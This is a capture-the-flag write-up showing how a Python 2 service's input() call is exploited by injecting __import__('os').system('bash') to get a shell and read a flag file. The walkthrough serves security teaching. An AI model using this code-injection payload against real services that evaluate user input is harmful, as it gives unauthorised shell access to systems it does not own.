# A Simple Conversation
Misc

## Challenge 

Written by: cppio

Someone on the internet wants to talk to you. Can you find out what they want?

nc misc.hsctf.com 9001

## Solution

Using python2 instead of python3

	~ $ nc misc.hsctf.com 9001
	Hello!
	Hey, can you help me out real quick.
	I need to know your age.
	What's your age?
	> k
	Traceback (most recent call last):
	  File "talk.py", line 18, in <module>
	    age = input("> ")
	  File "<string>", line 1, in <module>
	NameError: name 'k' is not defined

Import OS module is working

	~ $ nc misc.hsctf.com 9001
	Hello!
	Hey, can you help me out real quick.
	I need to know your age.
	What's your age?
	> __import__('os')    
	Wow!
	Sometimes I wish I was <module 'os' from '/usr/lib/python2.7/os.pyc'>
	Well, it was nice meeting you, <module 'os' from '/usr/lib/python2.7/os.pyc'>-year-old.
	Goodbye!

Use `os.system()` to spawn a shell

	~ $ nc misc.hsctf.com 9001
	Hello!
	Hey, can you help me out real quick.
	I need to know your age.
	What's your age?
	> __import__('os').system('bash')
	ls
		bin
		boot
		dev
		etc
		flag.txt
		home
		lib
		lib64
		media
		mnt
		opt
		proc
		root
		run
		sbin
		srv
		sys
		talk.py
		tmp
		usr
		var
	cat flag.txt
		hsctf{plz_u5e_pyth0n_3}

## Flag

	hsctf{plz_u5e_pyth0n_3}
